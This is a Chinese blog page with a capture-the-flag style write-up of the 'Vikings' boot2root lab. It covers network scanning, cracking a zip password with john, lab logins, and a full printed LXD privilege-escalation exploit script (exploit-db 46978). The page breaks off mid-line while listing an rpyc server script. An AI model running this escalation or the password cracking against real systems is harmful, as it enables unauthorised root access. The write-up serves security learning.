@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//fastly.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"192.168.6.128","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Vikings简介​    一道boot2root的综合靶场练习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vikings">
+<meta property="og:url" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/index.html">
+<meta property="og:site_name" content="菜心">
+<meta property="og:description" content="Vikings简介​    一道boot2root的综合靶场练习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/1.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/2.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/3.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/4.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/5.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/6.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/7.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/8.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/9.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/10.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/11.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/12.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/13.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/14.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/15.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/16.png">
+<meta property="og:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/17.png">
+<meta property="article:published_time" content="2023-07-02T09:34:14.000Z">
+<meta property="article:modified_time" content="2023-07-02T12:32:50.257Z">
+<meta property="article:author" content="菜心">
+<meta property="article:tag" content="入门">
+<meta property="article:tag" content="综合靶场测试">
+<meta property="article:tag" content="Vikings">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/Vikings/1.png">
+
+<link rel="canonical" href="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vikings | 菜心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">菜心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://192.168.6.128/2023/07/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Vikings/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.gif">
+      <meta itemprop="name" content="菜心">
+      <meta itemprop="description" content="目标&&付出">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vikings
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-02 17:34:14 / 修改时间：20:32:50" itemprop="dateCreated datePublished" datetime="2023-07-02T17:34:14+08:00">2023-07-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/Vikings/" itemprop="url" rel="index"><span itemprop="name">Vikings</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Vikings"><a href="#Vikings" class="headerlink" title="Vikings"></a>Vikings</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2021</li>
+<li>Vikings</li>
+<li>windows10</li>
+</ul>
+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\Desktop&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:39:ba:4c, IPv4: 192.168.6.142</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.6.1     40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.6.102   00:0c:29:2e:0c:75       VMware, Inc.</span><br><span class="line">192.168.6.145   40:31:3c:15:b7:8a       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.6.228   2c:f0:5d:3c:2d:9c       (Unknown)</span><br><span class="line">192.168.6.188   34:ce:00:e7:2c:2c       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.6.129   20:0d:b0:33:04:e3       Shenzhen Four Seas Global Link Network Technology Co., Ltd. (DUP: 1)</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.898 seconds (134.88 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 <code>192.168.6.129</code></li>
+<li><code>NMAP</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.6.129</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">22 80</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.6.129/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">/site                 (Status: 301) [Size: 313] [--&gt; http://192.168.6.129/site/]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.6.129/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">/war.txt              (Status: 200) [Size: 13]</span><br></pre></td></tr></table></figure>
+
+<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
+<li>首页</li>
+</ul>
+<p><img data-src="./Vikings/1.png" alt></p>
+<p><img data-src="./Vikings/2.png" alt></p>
+<ul>
+<li><a href="http://192.168.6.129/site/war.txt" target="_blank" rel="noopener">http://192.168.6.129/site/war.txt</a></li>
+</ul>
+<p><img data-src="./Vikings/3.png" alt></p>
+<ul>
+<li><a href="http://192.168.6.129/site/war-is-over" target="_blank" rel="noopener">http://192.168.6.129/site/war-is-over</a></li>
+</ul>
+<p><img data-src="./Vikings/4.png" alt></p>
+<ul>
+<li>解析后发现为压缩包文件</li>
+</ul>
+<p><img data-src="./Vikings/5.png" alt></p>
+<ul>
+<li>存在密码</li>
+</ul>
+<p><img data-src="./Vikings/6.png" alt></p>
+<ul>
+<li>解压密码</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./temp.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">FAIL!</span><br><span class="line"></span><br><span class="line">zip2john temp.zip &gt; zip.hashes</span><br><span class="line">cat zip.hashes  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt zip.hashes </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\vikings&gt; john --wordlist=/usr/share/wordlists/rockyou.txt zip.hashes</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">ragnarok123      (temp.zip/king)</span><br><span class="line">1g 0:00:00:02 DONE (2023-07-02 06:13) 0.3690g/s 111846p/s 111846c/s 111846C/s redsox#1..kweens</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>获得解压密码<code>ragnarok123</code></p>
+</li>
+<li><p>解压后发现存在仍存在1压缩文件</p>
+</li>
+</ul>
+<p><img data-src="./Vikings/7.png" alt></p>
+<p><img data-src="./Vikings/8.png" alt></p>
+<p><img data-src="./Vikings/9.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\root\vulnhub\vikings\temp\_king.extracted&gt; cat user </span><br><span class="line">//FamousBoatbuilder_floki@vikings                                     </span><br><span class="line">//f@m0usboatbuilde7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>账号密码 <code>floki / f@m0usboatbuilde7</code></li>
+</ul>
+<h3 id="提权-amp-amp-ROOT"><a href="#提权-amp-amp-ROOT" class="headerlink" title="提权&amp;&amp;ROOT"></a>提权&amp;&amp;ROOT</h3><ul>
+<li>成功登录普通用户<code>floki</code></li>
+</ul>
+<p><img data-src="./Vikings/10.png" alt></p>
+<ul>
+<li>第一种 lxd提权</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">C:\root\vulnhub\vikings\temp&gt; cat /usr/share/exploitdb/exploits/linux/local/46978.sh                130 ⨯</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authors: Marcelo Vazquez (S4vitar)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">          Victor Lasa      (vowkin)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 3: Run this script and you will get root [Victim Machine]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</span></span><br><span class="line"></span><br><span class="line">function helpPanel()&#123;</span><br><span class="line">  echo -e "\nUsage:"</span><br><span class="line">  echo -e "\t[-f] Filename (.tar.gz alpine file)"</span><br><span class="line">  echo -e "\t[-h] Show this help panel\n"</span><br><span class="line">  exit 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createContainer()&#123;</span><br><span class="line">  lxc image import $filename --alias alpine &amp;&amp; lxd init --auto</span><br><span class="line">  echo -e "[*] Listing images...\n" &amp;&amp; lxc image list</span><br><span class="line">  lxc init alpine privesc -c security.privileged=true</span><br><span class="line">  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true</span><br><span class="line">  lxc start privesc</span><br><span class="line">  lxc exec privesc sh</span><br><span class="line">  cleanup</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function cleanup()&#123;</span><br><span class="line">  echo -en "\n[*] Removing container..."</span><br><span class="line">  lxc stop privesc &amp;&amp; lxc delete privesc &amp;&amp; lxc image delete alpine</span><br><span class="line">  echo " [√]"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set -o nounset</span><br><span class="line">set -o errexit</span><br><span class="line"></span><br><span class="line">declare -i parameter_enable=0; while getopts ":f:h:" arg; do</span><br><span class="line">  case $arg in</span><br><span class="line">    f) filename=$OPTARG &amp;&amp; let parameter_enable+=1;;</span><br><span class="line">    h) helpPanel;;</span><br><span class="line">  esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ $parameter_enable -ne 1 ]; then</span><br><span class="line">  helpPanel</span><br><span class="line">else</span><br><span class="line">  createContainer</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</span><br><span class="line"></span><br><span class="line">./build-alpine</span><br><span class="line">sed -i 's/\r//g'</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./Vikings/11.png" alt></p>
+<p><img data-src="./Vikings/12.png" alt></p>
+<ul>
+<li>第二种 预期解 查看boat文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat boat</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Printable chars are your ally.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">num = 29th prime-number.</span></span><br><span class="line">collatz-conjecture(num)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里用到一个解密游戏</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boat 文件中说的是 collatz-conjecture （考拉兹猜想），又称为3n＋1猜想等，是指对于每一个正整数，如果它是奇数，则对它乘3再加1，如果它是偶数，则对它除以2，如此循环，最终都能够得到1。如n = 6，根据上述数式，得出 6→3→10→5→16→8→4→2→1。boat 中的意思是求第 29 个素数的 collatz-conjecture 结果，网上差的结果是 29th Prime Number = 109</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Decimal 解码得：<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code></li>
+<li>拿到ragnar账户</li>
+</ul>
+<p><img data-src="./Vikings/13.png" alt></p>
+<p><img data-src="./Vikings/14.png" alt></p>
+<ul>
+<li>发现用户跑 <code>rpyc_classic.py</code> 程序</li>
+</ul>
+<p><img data-src="./Vikings/15.png" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">ragnar@vikings:~$ cat /usr/local/bin/rpyc_classic.py</span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">classic rpyc server (threaded, forking or std) running a SlaveService</span></span><br><span class="line"><span class="string">usage:</span></span><br><span class="line"><span class="string">    rpyc_classic.py                         # default settings</span></span><br><span class="line"><span class="string">    rpyc_classic.py -m forking -p 12345     # custom settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # ssl-authenticated server (keyfile and certfile are required)</span></span><br><span class="line"><span class="string">    rpyc_classic.py --ssl-keyfile keyfile.pem --ssl-certfile certfile.pem --ssl-cafile cafile.pem</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line"><span class="keyword">from</span> plumbum <span class="keyword">import</span> cli</span><br><span class="line"><span class="keyword">from</span> rpyc.utils.server <span class="keyword">import</span> ThreadedServer, ForkingServer, OneShotServer</span><br><span class="line"><span class="keyword">from</span> rpyc.utils.classic <span class="keyword">import</span> DEFAULT_SERVER_PORT, DEFAULT_SERVER_SSL_PORT</span><br><span class="line"><span class="keyword">from</span> rpyc.utils.registry <span class="keyword">import</span> REGISTRY_PORT</span><br><span class="line"><span class="keyword">from</span> rpyc.utils.registry <span class="keyword">import</span> UDPRegistryClient, TCPRegistryClient</span><br><span class="line"><span class="keyword">from</span> rpyc.utils.authenticators 